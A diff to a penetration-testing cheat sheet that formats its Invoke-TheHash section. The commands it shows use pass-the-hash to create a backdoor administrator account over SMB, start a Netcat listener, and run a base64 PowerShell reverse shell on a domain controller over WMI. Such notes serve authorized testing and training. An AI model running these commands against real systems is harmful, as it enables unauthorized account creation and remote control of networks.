@@ -3935,19 +3935,19 @@ When using Invoke-TheHash, we have two options: SMB or WMI command execution. To
 <details>
 <summary><h4>Invoke-TheHash with SMB</h4></summary>
 
-Import the module
+**Import the module**
 
 ```powershell
 Import-Module .\Invoke-TheHash.psd1
 ```
 
-Create a new user and add it to the Adminitrators group
+**Create a new user and add it to the Adminitrators group**
 
 ```powershell
 Invoke-SMBExec -Target <IP> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
 ```
 
-Expected output
+**Expected output**
 
 ```powershell
 VERBOSE: [+] <DOMAIN>\<USER> successfully authenticated on <IP>
@@ -3965,26 +3965,29 @@ We can also get a reverse shell connection in the target machine.
 <details>
 <summary><h4>Netcat listener</h4></summary>
 
+**Start Netcat**
+
 ```powershell
-.\nc.exe -lvnp 8001
+.\nc.exe -lvnp <PORT>
 ```
 
 To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP and port, and select the option *PowerShell #3 (Base64)*.
 
 To perform Pass-the-Hash (PtH) execution of a PowerShell reverse shell on the target DC01, use the following syntax with Invoke-TheHash:
 
-Import the module
+**Import the module**
 
 ```powershell
 Import-Module .\Invoke-TheHash.psd1
 ```
 
-Excute the reverse shell
+**Excute the reverse shell**
 
 ```powershell
 Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
 ```
 
+The result is a reverse shell connection from the DC01 host.
 
 </details>
 
